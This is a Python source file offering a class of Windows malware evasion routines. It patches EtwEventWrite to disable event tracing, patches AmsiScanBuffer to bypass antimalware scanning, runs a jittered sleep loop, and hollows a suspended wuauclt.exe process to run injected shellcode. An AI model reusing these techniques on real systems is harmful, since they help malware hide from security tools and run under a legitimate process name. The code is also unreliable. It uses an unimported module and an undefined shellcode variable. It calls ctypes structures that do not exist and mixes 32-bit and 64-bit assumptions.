import ctypes
from ctypes import wintypes
import time

class Evasion:
    @staticmethod
    def disable_etw():
        """Patch ETW providers"""
        ntdll = ctypes.windll.ntdll
        # Patch EtdwTiWriteEvent
        patch = bytearray([0x48, 0x31, 0xC0, 0xC3])  # XOR RAX,RAX; RET
        addr = ctypes.cast(ntdll.EtwEventWrite, ctypes.c_void_p).value
        ctypes.windll.kernel32.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(wintypes.DWORD()))
        ctypes.memmove(addr, patch, len(patch))
    
    @staticmethod
    def disable_amsi():
        """Patch AmsiScanBuffer"""
        amsi = ctypes.windll.LoadLibrary("amsi.dll")
        amsi_scan = ctypes.cast(amsi.AmsiScanBuffer, ctypes.c_void_p).value
        patch = bytearray([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3])  # AMSI_E_NO_FUNCTION
        ctypes.windll.kernel32.VirtualProtect(amsi_scan, len(patch), 0x40, None)
        ctypes.memmove(amsi_scan, patch, len(patch))
    
    @staticmethod
    def sleep_masking(jitter=0.1):
        """Randomized jittered sleep"""
        while True:
            time.sleep(random.uniform(5 + jitter, 10 + jitter))
            jitter *= random.choice([0.9, 1.1])
    
    @staticmethod
    def process_hollow(target_proc="wuauclt.exe"):
        """Hollow into legit update process"""
        # Create suspended wuauclt.exe
        pi = wintypes.PROCESS_INFORMATION()
        si = wintypes.STARTUPINFO()
        ctypes.windll.kernel32.CreateProcessW(
            None, target_proc, None, None, False, 0x4, None, None, si, pi)
        
        # Unmap legit code, write shellcode
        ctx = wintypes.CONTEXT()
        ctx.ContextFlags = 0x10001F
        ctypes.windll.kernel32.GetThreadContext(pi.hThread, ctypes.byref(ctx))
        base_addr = ctx.Ebx  # PEB.ImageBaseAddress
        
        # Write shellcode to target memory
        ctypes.windll.kernel32.WriteProcessMemory(pi.hProcess, base_addr, shellcode, len(shellcode), None)
        ctx.Eax = base_addr  # Set entry point
        ctypes.windll.kernel32.SetThreadContext(pi.hThread, ctypes.byref(ctx))
        ctypes.windll.kernel32.ResumeThread(pi.hThread)
